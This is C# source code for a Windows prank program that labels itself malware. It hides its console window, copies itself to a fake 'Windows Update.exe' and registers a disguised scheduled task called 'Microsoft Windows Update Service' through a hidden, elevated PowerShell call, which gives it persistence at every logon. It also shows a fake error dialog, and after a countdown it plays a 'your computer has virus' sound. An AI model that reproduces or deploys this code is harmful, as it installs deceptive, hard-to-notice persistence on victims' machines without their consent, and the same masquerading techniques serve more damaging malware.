using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Timers;

namespace computar
{
    internal static class Program
    {
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        private static int countdown_yur_compiutar_has_vairus;
        private static readonly Timer timer1 = new Timer();
        private static readonly string location_path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft", "Windows Update.exe");

        private static void Main()
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, 0);
            SetStartup();
            Random rnd = new Random();
            countdown_yur_compiutar_has_vairus = rnd.Next(500, 1500);
            timer1.Elapsed += Timer1_Tick;
            timer1.Interval = 1000;
            timer1.Start();
            Console.ReadLine();
        }

        private static async void Timer1_Tick(object sender, EventArgs e)
        {
            if (countdown_yur_compiutar_has_vairus != 0)
            {
                countdown_yur_compiutar_has_vairus--;
            }
            else
            {
                Stream str = Properties.Resources.hello_your_computer_has_virus;
                System.Media.SoundPlayer snd = new System.Media.SoundPlayer(str);
                snd.Play();
                timer1.Stop();
                await Task.Delay(5000).ConfigureAwait(false);
                Environment.Exit(0);
            }
        }

        private static void SetStartup()
        {
            if (!File.Exists(location_path))
            {
                File.Copy(Path.GetDirectoryName(Assembly.GetEntryAssembly().Location + "\\" + AppDomain.CurrentDomain.FriendlyName), location_path);
                // Running as admin may work because Micro$oft sucks
                StringBuilder sb = new StringBuilder();
                sb.AppendLine("<?xml version=\"1.0\" encoding=\"UTF-16\"?>");
                sb.AppendLine("<Task version=\"1.4\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">");
                sb.AppendLine("  <RegistrationInfo>");
                sb.AppendLine("    <Date>1999-01-01T00:00:00.0000000</Date>");
                sb.AppendLine("    <Author>Microsoft</Author>");
                sb.AppendLine($"    <URI>\\Microsoft\\Windows\\Printing</URI>");
                sb.AppendLine("  </RegistrationInfo>");
                sb.AppendLine("  <Triggers>");
                sb.AppendLine("    <LogonTrigger>");
                sb.AppendLine("      <Enabled>true</Enabled>");
                sb.AppendLine("      <Delay>PT1M</Delay>");
                sb.AppendLine("    </LogonTrigger>");
                sb.AppendLine("  </Triggers>");
                sb.AppendLine("  <Principals>");
                sb.AppendLine("    <Principal id=\"Author\">");
                sb.AppendLine("      <LogonType>InteractiveToken</LogonType>");
                sb.AppendLine("      <RunLevel>HighestAvailable</RunLevel>");
                sb.AppendLine("    </Principal>");
                sb.AppendLine("  </Principals>");
                sb.AppendLine("  <Settings>");
                sb.AppendLine("    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>");
                sb.AppendLine("    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>");
                sb.AppendLine("    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>");
                sb.AppendLine("    <AllowHardTerminate>false</AllowHardTerminate>");
                sb.AppendLine("    <StartWhenAvailable>false</StartWhenAvailable>");
                sb.AppendLine("    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>");
                sb.AppendLine("    <IdleSettings>");
                sb.AppendLine("      <StopOnIdleEnd>false</StopOnIdleEnd>");
                sb.AppendLine("      <RestartOnIdle>false</RestartOnIdle>");
                sb.AppendLine("    </IdleSettings>");
                sb.AppendLine("    <AllowStartOnDemand>false</AllowStartOnDemand>");
                sb.AppendLine("    <Enabled>true</Enabled>");
                sb.AppendLine("    <Hidden>false</Hidden>");
                sb.AppendLine("    <RunOnlyIfIdle>false</RunOnlyIfIdle>");
                sb.AppendLine("    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>");
                sb.AppendLine("    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>");
                sb.AppendLine("    <WakeToRun>false</WakeToRun>");
                sb.AppendLine("    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>");
                sb.AppendLine("    <Priority>7</Priority>");
                sb.AppendLine("    <RestartOnFailure>");
                sb.AppendLine("      <Interval>PT1M</Interval>");
                sb.AppendLine("      <Count>10</Count>");
                sb.AppendLine("    </RestartOnFailure>");
                sb.AppendLine("  </Settings>");
                sb.AppendLine("  <Actions Context=\"Author\">");
                sb.AppendLine("    <Exec>");
                sb.AppendLine($"      <Command>{location_path}</Command>");
                sb.AppendLine("      <Arguments>-task</Arguments>");
                sb.AppendLine($"      <WorkingDirectory>{location_path.Replace(AppDomain.CurrentDomain.FriendlyName, "")}</WorkingDirectory>");
                sb.AppendLine("    </Exec>");
                sb.AppendLine("  </Actions>");
                sb.AppendLine("</Task>");
                File.WriteAllText(Path.Combine(Path.GetTempPath(), "temp.xml"), sb.ToString());
                File.WriteAllText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft", "Windows Update.txt"), "YOU JUST GOT PRANKED!\nMalware by EnderIce2\nSource Code: https://github.com/EnderIce2/computar");
                string arg = $"Register-ScheduledTask -xml (Get-Content '{Path.Combine(Path.GetTempPath(), "temp.xml")}' | Out-String) -TaskName 'Microsoft Windows Update Service' -TaskPath '\\Microsoft\\Windows\\Printing' -Force";

                Process process = new Process();
                process.StartInfo.Verb = "runas";
                process.StartInfo.FileName = "powershell.exe";
                process.StartInfo.Arguments = "-Command \"" + arg + "\"";
                process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                process.Start();
                process.WaitForExit();

                Process process1 = new Process();
                process1.StartInfo.FileName = "powershell.exe";
                process1.StartInfo.Arguments = "-Command \"Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('Internal error. Result Code: 0x0026F1')\"";
                process1.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                process1.Start();
                process1.WaitForExit();

                try
                {
                    Process.Start(location_path);
                    Task.Delay(1000);
                    Environment.Exit(0);
                }
                catch (Exception) { }
            }
        }
    }
}